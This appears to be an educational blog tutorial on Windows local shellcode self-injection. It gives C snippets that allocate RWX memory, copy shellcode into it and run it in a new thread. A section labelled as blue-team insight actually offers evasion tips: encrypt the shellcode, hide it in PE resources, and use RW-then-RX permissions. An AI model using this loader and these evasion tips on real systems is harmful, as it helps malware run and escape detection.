## Introduction
<p style="text-align: justify;"> Local Shellcode Injection, often called Self Injection, is one of the most basic yet important techniques to understand in Windows malware development and red teaming. The concept is straightforward: </p>
<strong><em>A process injects and executes shellcode within its own memory space</em></strong><br>
<p style="text-align: justify;"> While the technique itself is not stealthy and is easily detected by modern AV and EDR solutions, it plays a critical educational role. Almost every advanced process injection technique builds upon the same foundations.</p>

## Flow
<p style="text-align: justify;"> At a High-Level, in self injection, everything happens inside the same process:
<ol start="2">
  <li>Allocate executable memory</li>
  <li>Copy shellcode into that memory</li>
  <li>Execute the shellcode using a thread</li>
  <li>Wait for execution and clean up</li>
</ol></p>

#### 1. Allocate executable memory
<p style="text-align: justify;">The first step consists of allocating memory within the current process using the Windows API. This memory region is reserved and committed with permissions that allow both writing and execution (PAGE_EXECUTE_READWRITE). Allocating executable memory is a prerequisite for shellcode execution, as the CPU must be able to fetch and run instructions from this region.</p>
```C
LPVOID mem_allocated = VirtualAlloc(
    NULL,
    sizeof(shellcode),
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
```

#### 2. Copy shellcode into that memory
<p style="text-align: justify;"> Once the memory is allocated, the shellcode is copied into the newly created memory region. At this stage, the payload exists only as raw bytes in memory.</p>
```C
RtlCopyMemory(mem_allocated, shellcode, sizeof(shellcode));
```

#### 3. Execute the shellcode using a thread
<p style="text-align: justify;"> To execute the shellcode, a new thread is created with its entry point set to the address of the allocated memory. This causes Windows to begin executing instructions directly from the injected shellcode.</p>
```C
HANDLE hThread = CreateThread(
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)mem_allocated,
    NULL,
    0,
    NULL
);
```

#### 4. Wait for execution and clean up
<p style="text-align: justify;"> After execution begins, the process waits for the shellcode thread to complete before cleaning up allocated resources. Handles are closed and memory is released to maintain process stability and avoid crashes.</p>
```C
WaitForSingleObject(hThread, INFINITE);
CloseHandle(hThread);
VirtualFree(mem_allocated, 0, MEM_RELEASE);
```

## Detection Perspective (Blue Team Insight)
<p style="text-align: justify;">
As discussed earlier, self injection is not opsec safe at all; however, multiple actions can be taken to reduce some of the most obvious red flags.
</p>

<p style="text-align: justify;">
First, the embedded shellcode can be encrypted or obfuscated and hidden within PE resources.
</p>

<p style="text-align: justify;">
Second, allocating memory with <code>RWX</code> permissions is a major red flag (executable memory regions are generally read-only, not writable). Instead, memory can be allocated with <code>RW</code> permissions, then the shellcode is copied into that memory space, and finaly the <code>VirtualProtect</code> API called to change the memory region from <code>RW</code> to <code>RX</code> before executing the thread.
</p>
